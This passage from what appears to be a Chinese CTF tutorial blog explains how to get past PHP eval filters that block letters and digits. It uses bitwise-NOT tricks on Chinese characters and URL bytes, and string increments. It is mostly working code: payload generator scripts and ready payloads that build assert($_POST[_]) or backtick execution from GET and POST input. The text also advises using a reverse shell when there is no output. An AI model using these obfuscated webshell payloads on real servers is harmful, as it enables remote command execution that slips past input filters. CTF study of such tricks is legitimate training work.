class="line">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span><br><span class="line">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span><br><span class="line">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span><br><span class="line">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span><br><span class="line">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span><br><span class="line">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span><br><span class="line">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span><br><span class="line">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span><br><span class="line">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span><br><span class="line">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span><br><span class="line">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span><br><span class="line">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span><br><span class="line">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span><br><span class="line">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span><br><span class="line">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span><br><span class="line">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span><br><span class="line">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span><br><span class="line">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span><br><span class="line">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span><br><span class="line">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span><br><span class="line">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span><br><span class="line">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span><br><span class="line">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span><br><span class="line">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span><br><span class="line">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span><br><span class="line">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span><br><span class="line">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span><br><span class="line">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span><br><span class="line">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span><br><span class="line">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span><br><span class="line">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span><br><span class="line">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span><br><span class="line">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span><br><span class="line">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span><br><span class="line">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span><br><span class="line">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span><br><span class="line">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span><br><span class="line">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span><br><span class="line">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span><br><span class="line">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span><br><span class="line">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span><br><span class="line">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span><br><span class="line">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;</span><br><span class="line">function mb_str_split( $string ) &#123;</span><br><span class="line">    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string );</span><br><span class="line">&#125;</span><br><span class="line">foreach (mb_str_split($word) as $c)</span><br><span class="line">&#123;</span><br><span class="line">    $arr[] = $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($x=0;$x&lt;strlen($shell);$x++)</span><br><span class="line">&#123;</span><br><span class="line">    for ($y=0;$y&lt;count($arr);$y++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = $arr[$y];</span><br><span class="line">        if ($shell[$x] == ~($k&#123;1&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            $result .= $k;</span><br><span class="line">            $result1 .= &quot;%&quot;.bin2hex($k&#123;1&#125;);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;通过在URL内GET方法提交?cmd=\&quot;具体命令\&quot;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;字符串：&quot;.$result;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;URL编码：&quot;.$result1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过在URL内使用GET方法提交?cmd&#x3D;”具体命令”即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assert</span><br><span class="line">中文字符串：极区区皮十勺</span><br><span class="line">URL编码：%9e%8c%8c%9a%8d%8b</span><br><span class="line">&lt;?php</span><br><span class="line">$a = &quot;极&quot;;</span><br><span class="line">echo bin2hex($a);</span><br><span class="line">//e69e81</span><br><span class="line">echo ~($a&#123;1&#125;);</span><br><span class="line">//0位e6，1位9e，2位81</span><br></pre></td></tr></table></figure>
<p>于是可以利用中文字符串写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++; //得到1，此时$_=1</span><br><span class="line">$__ = &quot;极&quot;；</span><br><span class="line">$___ = ~($__&#123;$_&#125;); //得到a，此时$___=&quot;a&quot;</span><br><span class="line">$__ = &quot;区&quot;；</span><br><span class="line">$___ .= ~($__&#123;$_&#125;); //得到s，此时$___=&quot;as&quot;</span><br><span class="line">$___ .= ~($__&#123;$_&#125;); //此时$___=&quot;ass&quot;</span><br><span class="line">$__ = &quot;皮&quot;；</span><br><span class="line">$___ .= ~($__&#123;$_&#125;); //得到e，此时$___=&quot;asse&quot;</span><br><span class="line">$__ = &quot;十&quot;；</span><br><span class="line">$___ .= ~($__&#123;$_&#125;); //得到r，此时$___=&quot;asser&quot;</span><br><span class="line">$__ = &quot;勺&quot;；</span><br><span class="line">$___ .= ~($__&#123;$_&#125;); //得到t，此时$___=&quot;assert&quot;</span><br><span class="line">$____ = &#x27;_&#x27;;</span><br><span class="line">$__ = &quot;寸&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;); //得到P，此时$____=&quot;_P&quot;</span><br><span class="line">$__ = &quot;小&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;); //得到O，此时$____=&quot;_PO&quot;</span><br><span class="line">$__ = &quot;欠&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;); //得到S，此时$____=&quot;_POS&quot;</span><br><span class="line">$__ = &quot;立&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;); //得到T，此时$____=&quot;_POST&quot;</span><br><span class="line">$_ = $$____; //$_ = $_POST</span><br><span class="line">$___($_[_]); //assert($_POST[_])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>也可以URL编码写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);</span><br><span class="line">$__=~(&quot;%a0%af%b0%ac%ab&quot;); //_POST取反</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);</span><br><span class="line">并且POST提交：_=system(&#x27;cat flag&#x27;);</span><br></pre></td></tr></table></figure>
<p>不需要再URL编码<br>也可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`;</span><br></pre></td></tr></table></figure>
<p>所以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__ = ~(&quot;%a0%af%b0%ac%ab&quot;);</span><br><span class="line">$___ = $$__;</span><br><span class="line">`$___[_]`;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$__ = ~(&quot;%a0%af%b0%ac%ab&quot;);$___ = $$__;`$___[_]`;</span><br></pre></td></tr></table></figure>
<p>同样由于反引号命令执行没有回显，所以POST提交使用反弹shell的命令  </p>
<h2 id="无字母数字自增绕过"><a href="#无字母数字自增绕过" class="headerlink" title="无字母数字自增绕过"></a>无字母数字自增绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>自增</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">++</span><br><span class="line">&lt;?php</span><br><span class="line">$a = A;</span><br><span class="line">++$a; ++$a;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br><span class="line">//输出C</span><br><span class="line">```  </span><br><span class="line">只要获取A，就可以自增获取BCD......  </span><br><span class="line">`++$a`先累加再输出，`$a++`先输出再累加  </span><br><span class="line">**自增自减**  </span><br></pre></td></tr></table></figure>
<?php
$_=[].'';
若不拼接一个空字符串，则输出的Array并非字符串，拼接一个空字符串使其变成字符串
echo $_[0];
//读取'Array'的0号字符
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字被过滤，所以使用一个不存在的变量代替，因为变量不存在，所以为假值0,`echo $_[$__];`  </span><br><span class="line">**PHP5**  </span><br><span class="line">构造：`assert($_POST[&#x27;_&#x27;]);`  </span><br></pre></td></tr></table></figure>
<?php
$_ = [].'';
$___=$_[$__];
$__=$___;
//赋值给$__为A
$_=$__;
++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;++$_;
//获得S，此时$_为S
$__.=$_;
//获得AS，此时$__为AS
$__.=$_;
//此时$__为ASS
$_=$___;
//让$_重新赋值为A
++$_;++$_;++$_;++$_;
//获得E
$__.=$_;
//此时$__为ASSE
接下来以此类推获取到ASSERT
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**自增POC生成脚本**  </span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
$cmd = strtoupper($_GET['cmd']);
$cmd2 = strtoupper($_GET['post']);
function POC($cmd){
    $i = 0;
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$_ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1);
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

function POC2($cmd){
    $i = 0;
    echo '$____ = "_";$__=$___;';
    $POC_pat1 = "\$__=\$___;";
    $POC_pat2 = "\$____ .=\$__;";
    while ($i<strlen($cmd)){
        $str1 = $cmd[$i];
        $POC1 = base_convert(bin2hex($str1),16,10)-base_convert(bin2hex("A"),16,10);
        if ($i<1) {
            $POC_pat3 = str_repeat("++\$__;",$POC1).$POC_pat2;
            echo $POC_pat3;
        }else{
            $str2 = $cmd[$i-1];
            if($str1==$str2){
                $POC_pat5 = $POC_pat2;
                echo $POC_pat5;
            }else{
                $POC_pat6 = $POC_pat1.str_repeat("++\$__;",$POC1).$POC_pat2;
                echo $POC_pat6;
            }
        }
        $i++;
    }
}

if (!empty($cmd)){
    $POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
    echo $POC_pat7;
    POC($cmd);
}
if (!empty($cmd2)){
    POC2($cmd2);
}
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到生成的payload为</span><br></pre></td></tr></table></figure>
<?php
$_=[].'';$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;
echo $_;
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">到那时还需要一个POST，那么输入`?cmd=assert&amp;post=POST`,用得到的结果构造</span><br></pre></td></tr></table></figure>
<?php
$_=[].'';$___=$_[$__];$__=$___;$_=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$____ = "_";$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
$__ = $$____; //$_POST
$_($__[_]); //assert($_POST[_])
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造payload时记得url编码，并同时POST提交`_=&#x27;提交命令&#x27;`  </span><br><span class="line">**php7**  </span><br><span class="line">php7只需获取一个POST即可，</span><br></pre></td></tr></table></figure>
<?php
$____ = "_";$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;
$_=$$____;
`$_[_]`;
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同样由于反引号没有回显，使用反弹shell即可  </span><br><span class="line">## 无字母数字特殊符号过滤</span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多过滤了`$`和`_`  </span><br><span class="line">**PHP7**  </span><br><span class="line">短标签:</span><br></pre></td></tr></table></figure>
<?php
phpinfo();
?>
<p>等同于<br><?= phpinfo();?><br>可直接执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用GET方式提交</span><br></pre></td></tr></table></figure>
<p>?&gt;<?= `{${~"%a0%b8%ba%ab"}[%a0]}`?><br>&#x2F;&#x2F;取反等同于?&gt;<?= `$_GET[%a0]?>&#96;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload</span><br></pre></td></tr></table></figure>
<p>?cmd&#x3D;?&gt;<?=`{${~"%a0%b8%ba%ab"}[%a0]}`?>&amp;%a0&#x3D;ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">但是`_`和`$`都被过滤了，显然还不能成功，在PHP7中我们可以使用($a)()一样调用函数  </span><br><span class="line">例如：  </span><br><span class="line">`call_user_func()`就等同于`(call_user_func)()`,所以我们利用取反运算可以得到  </span><br><span 